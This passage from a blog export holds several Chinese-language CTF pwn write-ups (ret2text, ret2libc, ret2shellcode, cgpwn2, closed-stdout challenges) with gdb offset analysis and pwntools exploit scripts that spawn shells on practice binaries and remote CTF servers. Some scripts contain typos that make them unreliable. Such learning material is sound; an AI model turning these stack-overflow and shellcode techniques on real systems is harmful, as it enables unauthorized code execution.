<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看代码，可以看出main函数中有gets函数，存在栈溢出漏洞<br><img data-src="https://pic4.zhimg.com/80/v2-535180f34be67dbe755cf8473706034b_1440w.webp"><br>发现还有有一个secure函数调用了system(“&#x2F;bin&#x2F;sh”)<br><img data-src="https://pic2.zhimg.com/80/v2-fc8a7c446eb25d23f3b1743f1720ec71_1440w.webp"><br>双击字符串Ctrl+X，记下”&#x2F;bin&#x2F;sh”的地址0x0804863A<br>0x0804863A就是需要返回的地址</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>用gdb调试<br>在调用gets函数的地址处0x080486AE设置断点<br>r 运行如下<br><img data-src="https://pic4.zhimg.com/80/v2-e896b8f6a61789dae7d55da0447d61c3_1440w.webp"><br>其中ebp为0xffffcff8,esp为0xffffcf70,那么s为[esp+0x1c]即0xffffcf8c，相对于ebp的偏移是0x6c，相对于返回地址的偏移是0x6c+4</p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2text&#x27;)</span><br><span class="line">target = 0x804863a</span><br><span class="line">sh.sendline(b&#x27;A&#x27; * (0x6c+4) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p><strong>疑问：</strong>我有一点不明白的是为什么IDA中看到的s相对于ebp的偏移是64h，而gdb调试出来的是0x6c+4<br>网上看到有一个只用IDA就成功地算出了偏移量，但对于文章里的解释并不是很理解<br>只能说有时候IDA还是与gdb的有出入，不过还是以gdb调试的为准<br><img data-src="https://pic2.zhimg.com/80/v2-3afcfae075e4dbe213e06287af171919_1440w.webp"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week2 T4</title>
    <url>/posts/31eee638/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2libc2"><a href="#T4-ret2libc2" class="headerlink" title="T4 ret2libc2"></a>T4 ret2libc2</h2><blockquote>
<p>2023-01-09WP<br>ctf-wiki 基础rop</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit，开启NX</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>拖入IDA看看<br>危险函数和ret2libc1相同都是gets<br>不同的是这次没有&#x2F;bin&#x2F;sh给我们用了<del>我还找了好久来着……</del><br>但是system函数还是有的<br>那我们先找出system的地址0x08048490<br><img data-src="https://pic1.zhimg.com/80/v2-d7208c51601dfd63bece7bfa14f509f4_1440w.webp"><br>接下来我们得想办法弄出个&#x2F;bin&#x2F;sh来<br>由于程序已经开启NX保护，我们无法直接写入栈<br>所以思考在bss段写入字符串  说实话，这个地方第一次看真的怎么都想不到……<br>然后接下来我又不会了，怎么找到bss…….博客上好多方法看得我头晕目眩，又还不会用ROPgadget……<br>最后我直接在IDA里快捷键G了一下跳到了.bss段<br>发现里面有个buff2(设计好了的吧？)，我们可以用gets函数写入&#x2F;bin&#x2F;sh到buff2<br><img data-src="https://pic1.zhimg.com/80/v2-02c0edc80f9a8a5d0576827773403920_1440w.webp"><br>去找gets的地址  得到0x8048460<br><img data-src="https://pic1.zhimg.com/80/v2-5ccf0533f58826d407436ee4665c121c_1440w.webp"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>用gdb暴力求出偏移量<br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br>终于可以写exp了</p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat( [b&#x27;a&#x27; * 112, gets_plt,   system_plt, buf2,buf2])</span><br><span class="line">#先覆盖溢出，返回gets函数的地址，</span><br><span class="line">#接着返回执行system函数的地址，然后传入gets函数参数buf2的地址,system函数的参数buf2</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>这篇<a href="https://zhuanlan.zhihu.com/p/53357764#:~:text=%E5%85%B6%E4%B8%AD%E5%85%B3%E9%94%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E6%98%AF%EF%BC%9A%20payload%20%3D%20flat%20%28%5B%27a%27%20%2A%20112%2C%20gets_plt%2C,buf2%2C%20system_plt%2C%200xabcdabcd%2C%20buf2%5D%29%20%E7%9B%B8%E4%BF%A1%E6%9C%89%E7%9A%84%E6%9C%8B%E5%8F%8B%E4%BC%9A%E4%B8%8D%E6%98%8E%E7%99%BD%EF%BC%8C%E4%B8%BA%E5%95%A5%E6%9C%89%E4%B8%AA%20%5Bgets_plt%2C%20pop_ebp%2C%20buf2%5D%EF%BC%8C%E8%BF%99%E6%A0%B7%E7%9A%84payload%E5%B8%83%E7%BD%AE%E3%80%82">文章</a>和这篇<a href="https://www.jianshu.com/p/4928e726a43f">博客</a>挺不错的<br>还有<a href="https://blog.csdn.net/ATFWUS/article/details/104565483">这篇</a></p>
<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>ctf-wiki的exp是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line"></span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat(</span><br><span class="line">    [&#x27;a&#x27; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>[‘a’ * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]为啥还需要一个 pop_ebx呢？<br>好像看到有博客说是为了堆栈平衡<br>其实就是用了两个gadget<br>在调用gets函数后，把参数buf2给pop掉，这样返回地址就变成了system，就会返回到system</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week2 T2</title>
    <url>/posts/d88d430d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-ret2text-上题的另一种解法"><a href="#T2-ret2text-上题的另一种解法" class="headerlink" title="T2 ret2text(上题的另一种解法)"></a>T2 ret2text(上题的另一种解法)</h2><blockquote>
<p>2023-01-09WP<br>网上看到另一种暴力解法感觉很不错于是自己做过了一遍<br><strong>0x01</strong>与<strong>0x02</strong>跟上题相同</p>
</blockquote>
<span id="more"></span>

<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>大体思路就是输入一堆测试数据然后调试看在那个输入点报错了，这个输入点就是刚好溢出的那个点，然后计算偏移量即可<br>先用cyclic生成有序字符队列<br><img data-src="https://pic4.zhimg.com/80/v2-3a1996514eab734175f5c32518ac5dc7_1440w.webp"><br>运行并输入生成的字符串<br><img data-src="https://pic4.zhimg.com/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br>得到invalid addres  0x62616164<br>用cyclic -l查找偏移量<br><img data-src="https://pic1.zhimg.com/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./ret2text&#x27;)</span><br><span class="line">success_addr = 0x0804863A</span><br><span class="line">payload = b&#x27;a&#x27; * 112  + p32(success_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week2 T3</title>
    <url>/posts/af8a739b/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-ret2libc1"><a href="#T3-ret2libc1" class="headerlink" title="T3 ret2libc1"></a>T3 ret2libc1</h2><blockquote>
<p>2023-01-09WP<br>ctf-wiki 基础rop</p>
</blockquote>
<span id="more"></span>

<h3 id="0x00-ctf-wiki中的原理解释"><a href="#0x00-ctf-wiki中的原理解释" class="headerlink" title="0x00  ctf-wiki中的原理解释"></a>0x00  ctf-wiki中的原理解释</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。<br><strong>0x01</strong><br>file checksec——32-bit，开启NX<br><img data-src="https://pic2.zhimg.com/80/v2-80ff23ddf6fa9ad28c2d42d4fbe68d4d_1440w.webp"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看源码，应该是gets函数的栈溢出<br><img data-src="https://pic2.zhimg.com/80/v2-5733f1e4a386a4ef5c7316035cb5a505_1440w.webp"><br>shift+f12看到有&#x2F;bin&#x2F;sh字符串,找地址为0x08048720<br><img data-src="https://pic4.zhimg.com/80/v2-db2ae8bc45848b27958075060c1762db_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-02907b4345d742100845714228c18270_1440w.webp"><br>并且在secure函数中有system函数，双击进去查看得到 system 函数地址为08048460<br><img data-src="https://pic4.zhimg.com/80/v2-d54eba26d72dbf06930f7d203b44307f_1440w.webp"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>gdb调试找偏移量<br><img data-src="https://pic4-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br><del>可能都是ctf-wiki里面的题的原因吧这里甚至连偏移量都和前面ret2text的一样</del></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>我们要直接返回执行system 函数，exp可以这样写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_addr = 0x08048460</span><br><span class="line">payload = flat([b&#x27;a&#x27; * 112, system_addr,b &#x27;b&#x27; * 4, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>这里的四个b是system函数的返回地址，这里只是起到让结构合法的作用，具体是什么不重要，因为我们只需要调用system就行了<br><del>我这个flat（）还查了好久是什么意思……实际上就是把几个字符串拼接在一起</del></p>
<h3 id="0x05-questions"><a href="#0x05-questions" class="headerlink" title="0x05 questions"></a>0x05 questions</h3><p>也可以直接返回system函数压参的地址0x0804860A(也就是 call    _system处的地址)而不返回函数的 plt 处，<br>但是32位一般返回plt处地址后先跟函数返回地址（虚拟的）再接参数<br>一个plt表和got表的<a href="https://detlfy-github-io-s.atrust.sdu.edu.cn:81/2021/09/29/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E4%B8%8E%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6/">教学文章</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week2 T5</title>
    <url>/posts/46e9d6ae/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-cgpwn2"><a href="#T5-cgpwn2" class="headerlink" title="T5 cgpwn2"></a>T5 cgpwn2</h2><blockquote>
<p>2023-01-09WP<br>攻防世界 pwn题</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit，开启NX保护</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA中打开window发现这题又是一个找不到&#x2F;bin&#x2F;sh的<br>但是在pwn函数中还是找到了system函数的<br><img data-src="https://pic4.zhimg.com/80/v2-068880d6f0f1427b812cd98bee561577_1440w.webp"><br>然后我们来看hello函数的反汇编代码<br><img data-src="https://pic4.zhimg.com/80/v2-c5dd01b36ac83fcdc19cf8ed3f804d0b_1440w.webp"><br>好像有点复杂，简单来说就是前面先定义了一堆变量，然后条件判断先不看了先看后面的<br>首先要求我们输入一个名字，通过fgets函数完成，并且从键盘最多只能读取32h个字符到name<br>然后再通过gets函数从键盘读取字符到s区域，没有输入字符数量的限制<br>其中name是bss段的一个大小为34的区域，<br><img data-src="https://pic3.zhimg.com/80/v2-a6b3d88fcbe601a724cad07d655b85f6_1440w.webp"><br>s是长度为0x26个字节的区域<br><img data-src="https://pic1.zhimg.com/80/v2-a33446043ab1e9de86ee374db4c9dd28_1440w.webp"><br>于是我们可以向name区域输入&#x2F;bin&#x2F;sh,然后让这个地址作为system函数的参数，而s则用来进行栈溢出，并让溢出的返回地址为system函数的地址</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(’61.147.171.105‘，51582)</span><br><span class="line">target = 0x804855A</span><br><span class="line">binsh = 0x804A080</span><br><span class="line">payload = b&#x27;a&#x27; * 0x26 +b &#x27;bbbb&#x27; #覆盖s和ebp的数据</span><br><span class="line">                 + p32(target) + p32(binsh)#返回gets函数的地址和参数</span><br><span class="line">a = r.recvuntil(&#x27;e\n&#x27;)</span><br><span class="line">p.sendline(&#x27;/bin/sh&#x27;)#向fget函数发送字符串</span><br><span class="line">a = r.recvuntil(&#x27;:\n&#x27;)#等待接受到括号内的信息后再运行下面的内容</span><br><span class="line">p.sendline(payload)#发送payload</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>好像不要a &#x3D; r.recvuntil(‘e\n’)，a &#x3D; r.recvuntil(‘:\n’)也可以……</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>week3 T2</title>
    <url>/posts/60312468/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-wustctf2020-closed"><a href="#T2-wustctf2020-closed" class="headerlink" title="T2 wustctf2020_closed"></a>T2 wustctf2020_closed</h2><blockquote>
<p>2023-01-15WP<br>BUUCTF  pwn<br>考点：close函数</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>做了hgame的第二题后，去补充了一下关于close函数的知识，再从BUUCTF中找了一题练了练<br>先file知道时64-bit</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>这一题结构很简单，再IDA中直接能找到在main函数中的vulnerable函数中return shell函数中有system函数<br>直接给好了<br><img data-src="https://pic2.zhimg.com/80/v2-bd22be15351c97aebae2de7f1bd0f4bd_1440w.webp"><br><img data-src="https://pic3.zhimg.com/80/v2-640c1ebbaa31c9a5013bd8feafceaee6_1440w.webp"><br><img data-src="https://pic4.zhimg.com/80/v2-2c7eb0afee1a164507dd332cf37e7813_1440w.webp"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>但是因为</p>
<blockquote>
<p>close(1)<br>  close(2)</p>
</blockquote>
<p>将标准输出和标准错误输出关闭了，这样在窗口上看不到输出<br>这时候就需要我们重新定位标准输出</p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p><strong>补充一些知识</strong></p>
<ul>
<li><p>在Linux中的文件，文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I&#x2F;O操作的系统调用都通过文件描述符。程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。</p>
</li>
<li><p>标准输入输出的指向是默认的，也就是默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端，我们可以修改它们的指向，也即重定位</p>
</li>
<li><p>我们可以将标准输出进行重定向</p>
</li>
<li><p>&amp;+文件描述符, 可以指代该文件(进程)</p>
</li>
</ul>
<p>现在可以解决close函数的问题了<br>在同一个进程里面, 标准输出和标准输入的指向都是相同的终端. 由于标准输入没有被禁用，所以我们可以使用命令</p>
<blockquote>
<p>exec 1&gt;&amp;0</p>
</blockquote>
<p>让标准输出定位到标准输入的文件，也就相当于重启了标准输出<br>本质上即exec+重定向命令，只不过操作的是文件描述符<br>现在cat到的flag就能够输出了<br><img data-src="https://pic3.zhimg.com/80/v2-49e09c530cab090cb5dedbddbd1a8812_1440w.webp"><br><del>出题人很有意思，连接上环境第一件事是嘲讽一下你</del></p>
<p><a href="https://blog.csdn.net/Y_peak/article/details/115406518">参考</a>    <a href="https://blog.csdn.net/Y_peak/article/details/115406518">文章</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>week3 T1</title>
    <url>/posts/f93875d2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-easy-overflow"><a href="#T1-easy-overflow" class="headerlink" title="T1 easy_overflow"></a>T1 easy_overflow</h2><blockquote>
<p>2023-01-14WP<br>Hgame week1 pwn 第二题<br>考点：简单栈溢出</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p><strong>file</strong>——64-bit,<br><strong>checksec</strong> 开启NX<br><img data-src="https://picx.zhimg.com/80/v2-b02ac7a02df1467f41fa6b8ed8ecf147_1440w.png?source=d16d100b"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>看源码，先找&#x2F;bin&#x2F;sh，一路索引过去发现在一个后门函数中</p>
<p><img data-src="https://picx.zhimg.com/80/v2-9e559b87dc3591a21383567579e57aec_1440w.png?source=d16d100b"></p>
<p><img data-src="https://pic1.zhimg.com/80/v2-6c43653aae10a9334f6d4a773827dcae_1440w.png?source=d16d100b"></p>
<p>然后我的第一反应是先记下call system的地址，结果一看，没找到？取而代之的是call    sub_401060<br>于是我卡了一下，可能是第一次碰到这样的题的缘故，我没有意识到函数名称可以是不一样的<br>打开main函数伪代码也是这样……<br><img data-src="https://pic1.zhimg.com/80/v2-d944638581f5f4e8ed3bb1f91435d464_1440w.webp"><br>越看越不对劲，搜索资料才发现这种题的风格就是去符号使原函数名字无法显示<br>这么说IDA无法解决了</p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>我们转而动态调试试一下<br>我们假设文件带有system函数，又据题意应该是有gets或者read之类的函数的<br>运行文件测试一下确实如此<br><img data-src="https://pic1.zhimg.com/80/v2-c0c3d1d2b64d886ff2b0c795be14315c_1440w.webp"><br>那么我们在这几个函数处试着打断点<br><img data-src="https://pic3.zhimg.com/80/v2-ff2f8659b478bef6651b656f3a5ee762_1440w.webp"><br>我们可以看到，其中system的地址和后面函数中的call    sub_401060的plt处地址对上了<br>read函数的地址和main函数中的 call    sub_401080的plt处地址对上了<br>同时呢，gdb运行文件的时候还发现main函数中还有一个close函数，浏览一下main函数源码只有sub_401070了<br><img data-src="https://pic2.zhimg.com/80/v2-4d7a5a5c48c6c578df4ef9f351eac149_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-8553dc620b792d521995f7e5718e1629_1440w.webp"><br>查阅了一些资料得知，close(1)关闭了标准输出，详细见这篇<a href="https://blog.csdn.net/xirenwang/article/details/104139866">文章</a><br>也就是有下面我们得到shell后无法在屏幕上看到flag的情况<br>这时候就要输入exec 1&gt;&amp;0重启标准输出<br>那么现在呢我们已经把文件里的几个主要函数分析好了，接下来就要找偏移量了</p>
<h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>这一部分我发现一个很坑的地方，如果我们用ctf-wilki上的方法，那么我们在gdb调试设断点的时候就不能设 </p>
<blockquote>
<p>b read</p>
</blockquote>
<p>这样设的话我们直接就进入到read函数里了，那就无法看到储存数据的寄存器（不管是什么）距rsp或者rbp的偏移了<br>并且，此时已经开始进入read子函数，即已经分配了新的栈帧了，rsp已经移动，再去计算rsp和rbp的差值则会不准确</p>
<blockquote>
<p>b  *0x4011be</p>
</blockquote>
<p>我们应该这样设断点，这样就停止在进入read函数之前，不仅可以看到相对偏移,还能计算出rbp-rsp<br><img data-src="https://pic3.zhimg.com/80/v2-9efe6dca6df2fee543e1ebc2027b17de_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-0d752265119152e7f608595ea4255d90_1440w.webp"><br>得出rsp和rsi 0x7fffffffddd0,rbp为0x7fffffffdde0,计算得距rbp偏移量就为0x7fffffffdde0-0x7fffffffddd0<br>那么再加上rbp求得为0x10+8</p>
<p>还可以暴力求得  <del>懒得计算偏移量的话</del><br><img data-src="https://pic4.zhimg.com/80/v2-c7ec27fdfb682541c8a7d2aeb8e4c663_1440w.webp"></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>可以写exp</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>, <span class="number">30574</span>)</span><br><span class="line"></span><br><span class="line">system_addr = 000000000401176</span><br><span class="line">payload = b <span class="string">&#x27; a &#x27;</span> * <span class="number">0x18</span> + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>好奇怪为什么官方的WP可以直接反汇编成正常的函数？<br>搜了一下好像可以手动添加标签,<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788796">这篇文章</a>教了一下这么回复库函数名，但是看不懂……</p>
<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p><img data-src="https://pic4.zhimg.com/80/v2-23c72811fac836cd0c8980516e1acc83_1440w.webp"><br>得到shell后发现并没有办法显示出flag，问题就在之前的那个close(1)因为汇编代码中有这样一句</p>
<blockquote>
<p>mov     edi, 1</p>
</blockquote>
<p>所以认为close()括号里的参数时1<br>这时候需要使用命令让shell能够正常回显</p>
<blockquote>
<p>exec 1&gt;&amp;0</p>
</blockquote>
<p>累死了，终于拿到flag<br><img data-src="https://pic2.zhimg.com/80/v2-ee060de7086e6945edf7fda074674fa5_1440w.webp"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title>week3 T3</title>
    <url>/posts/173614fe/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-ret2shellcode-1-bss段写入"><a href="#T3-ret2shellcode-1-bss段写入" class="headerlink" title="T3 ret2shellcode 1  (bss段写入)"></a>T3 ret2shellcode 1  (bss段写入)</h2><blockquote>
<p>2023-01-15WP<br>ctf-wiki pwn<br>考点：栈溢出 shellcode</p>
</blockquote>
<span id="more"></span>

<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file，checksec —— 32bit，啥保护都没开<br><img data-src="https://pic1.zhimg.com/80/v2-c30ffe5ee07a9e5b5d0f124f011cc634_1440w.webp"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看源码，没有system函数和&#x2F;bin&#x2F;sh字符串<br>并且可以看到，main函数中，gets函数读取用户输入到变量s，strcnp将s中的字符串复制到buf2处<br><img data-src="https://pic3.zhimg.com/80/v2-da432353b394322fd2a9113c6042b0c6_1440w.webp"><br>buf2并没有在main函数中看到定义，应该是全局变量，进一步查看buf2在bss段中<br><img data-src="https://pic1.zhimg.com/80/v2-96ffdd44e368d33ff3f3def08797ce38_1440w.webp"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>通过vmmap我们可以查看bss段是否具有可执行权限<br><img data-src="https://pic1.zhimg.com/80/v2-3cac07ac2fda33db599f641decbd4a20_1440w.webp"><br>rw-p，可读可写<br>（这里操作上要注意一下，vmmap的命令要在程序运行时使用，可以给程序下断点或者ctrl+C停住程序再输命令）</p>
<p><a href="https://ch4r1l3.github.io/2018/06/22/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E4%B8%89%E7%AB%A0%E2%80%94%E2%80%94gdb%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">参考资料</a></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>有执行权限的话就可以向bss段写入shellcode了，之后控制程序返回执行shellcode<br>在写exp之前还要先计算偏移量，方法和ret2text类似，与之前的偏移量都是一样的<br>用gdb调试或者爆破求出偏移量为112<br>使用shellcraft.sh()生成shellcode，并且用shellcode.ljust()方法向左对齐补齐字符串，溢出填充返回地址<br>exp为</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>好像shellcode写在栈或者bss段上都可以吧？</p>
<p>网上看到一个解释说不能直接把shellcode写在栈上？不知道对不对：<br>绝大多数的操作系统都默认开启ASLR保护，这大大提高了攻击栈的难度。因此，栈应当是我们最后考虑的对象</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf-wiki</tag>
      </tags>
  </entry>
  <entry>
    <title>week3 T5</title>
    <url>/posts/fe55b1cb/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-level2"><a href="#T5-level2" class="headerlink" title="T5 level2"></a>T5 level2</h2><blockquote>
<p>2023-01-15WP<br>攻防世界pwn题<br>考点：ret2libc1<br>（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……）</p>
</blockquote>
<span id="more"></span>

